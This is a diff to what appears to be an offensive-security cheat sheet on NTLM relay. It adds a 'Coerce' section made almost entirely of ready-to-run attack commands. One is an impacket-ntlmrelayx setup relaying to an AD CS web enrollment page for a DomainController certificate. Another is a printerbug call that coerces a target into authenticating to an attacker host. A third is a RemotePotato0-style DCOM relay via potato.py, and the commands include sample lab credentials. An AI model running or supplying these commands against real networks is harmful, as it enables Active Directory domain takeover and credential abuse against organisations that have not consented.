@@ -1,5 +1,32 @@
 # Relay, Reflect
 
+## Coerce
+
+### PrinterBug (MS-RPRN)
+
+```bash
+impacket-ntlmrelayx \
+-t 'http://WIN-NUU0DPB1BVC.contoso.org/certsrv/certfnsh.asp' \
+-smb2support \
+--template DomainController \
+--adcs \
+--no-http-server \
+--no-wcf-server \
+--no-raw-server
+
+printerbug 'contoso.org'/'TestAlpha':'win10-gui-P@$swd'@'192.168.68.64' '192.168.68.10'
+# printerbug 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
+```
+
+### RemotePotato0-like (MS-DCOM ADCS)
+
+```bash
+python3 examples/potato.py \
+-clsid 'D99E6E74-FC88-11D0-B498-00A0C90312F3' \
+-relay-ip 192.168.1.145 \
+sales/alice:'1AM4l1c3!?1'@win-srv01.sales.contoso.lab
+```
+
 ## KRB5
 
 ### relay by abusing the `CredMarshalTargetInfo()` function
